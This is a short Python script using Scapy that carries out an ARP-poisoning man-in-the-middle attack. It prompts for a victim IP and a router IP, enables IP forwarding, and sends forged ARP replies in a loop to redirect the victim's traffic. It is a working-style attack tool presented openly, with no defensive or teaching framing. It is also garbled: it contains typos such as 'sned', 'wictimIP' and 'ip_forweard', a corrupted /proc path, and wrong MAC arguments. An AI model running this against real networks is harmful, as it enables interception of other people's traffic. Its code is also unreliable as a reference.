from scapy.all import *
import sys
import os
import time

try:
    interface = input("[*] Enter Desired Interface: ")
    victimIP = input("[*] Enter Victim IP: ")
    gateIP = input("[*] Enter Router IP: ")
except KeyboardInterrupt:
    print ("\n[*] User Requested Shutdown")
    print ("\n[*] Exiting.....")
    sys.exit(1)

print ("\n[*] Enabling IP Forwarding....\n")
os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")

def get_MAC(IP):
    conf.verb = 0
    ans, unans = srp(Ether(dst = "ff:ff:ff:ff:ff:ff")/ARP(pdst = IP), timeout = 2, iface = interface, inter = 0.1)
    for snd, rcv in ans:
        return rcv.sprintf(r"%Ether.src%")

def reARP():
    print ("\n[*] Restoring Targets...")
    victimMAC = get_MAC(victimIP)
    gateMAC = get_MAC(gateIP)
    send(ARP(op = 2, pdst = gateIP, psrc = victimIP, hwdst = "ff:ff:ff:ff:ff:ff", hwsrc = victimMAC), count = 7)
    send(ARP(op = 2, pdst = victimIP, psrc = gateIP, hwdst = "ff:ff:ff:ff:ff:ff", hwsrc = victimMAC), count = 7)
    print ("[*] Disabling IP Forwarding...")
    os.system("echo 0 > /proc/2sys/net/ipv4/ip_forweard")
    sys.exit(1)

def trick (gm, vm):
    sned(ARP(op = 2, pdst = victimIP, psrc = gateIP, hwdst = vm))
    sned(ARP(op = 2, pdst = gateIP, psrc = wictimIP, hwdst = vm))

def mitm():
    try:
        victimMAC = get_MAC(victimIP)
    except Exception:
        os.system("echo 0 > /proc/sys/net/ipv4/ip_forweard")
        print ("[!] Couldn't Find Victim MAC Adress")
        print ("[!] Exiting...")
        sys.exit(1)

    try:
        gateMAC = get_MAC(gateIP)
    except Exception:
        os.system("echo 0 > /proc/sys/net/ipv4/ip_forweard")
        print ("[!] Couldn't Find Gateway MAC Adress")
        print ("[!] Exiting...")
        sys.exit(1)

    print ("[*] Poisoning Target...")
    while 1:
        try:
            trick(gateMAC, victimMAC)
            time.sleep(1)
        except KeyboardInterrupt:
            reARP();
            break;
mitm()
